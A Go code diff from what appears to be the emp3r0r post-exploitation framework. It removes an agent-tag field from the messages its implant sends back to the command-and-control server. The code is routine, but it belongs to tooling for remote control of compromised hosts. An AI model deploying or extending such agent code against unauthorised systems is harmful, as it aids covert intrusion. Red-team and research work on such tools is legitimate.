@@ -9,7 +9,6 @@ import (
 	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -42,9 +41,7 @@ func send2CC(data *def.MsgTunData) error {
 
 // NotifyC2 send response to a cobra command to CC, like fmt.Printf
 func NotifyC2(cmd *cobra.Command, format string, args ...any) {
-	msg := def.MsgTunData{
-		Tag: common.RuntimeConfig.AgentTag,
-	}
+	msg := def.MsgTunData{}
 	job_id, _ := cmd.Flags().GetString("job_id")
 	cmdSlice := []string{cmd.Name()}
 	// A --quiet invocation (e.g. `!list_tokens --quiet` issued by the CC
@@ -78,9 +75,7 @@ func NotifyC2(cmd *cobra.Command, format string, args ...any) {
 
 // NotifyC2Binary sends raw binary response to a cobra command to CC
 func NotifyC2Binary(cmd *cobra.Command, data []byte) {
-	msg := def.MsgTunData{
-		Tag: common.RuntimeConfig.AgentTag,
-	}
+	msg := def.MsgTunData{}
 	job_id, _ := cmd.Flags().GetString("job_id")
 	cmdSlice := []string{cmd.Name()}
 	// Same quiet marker as NotifyC2: completion invocations ship their data
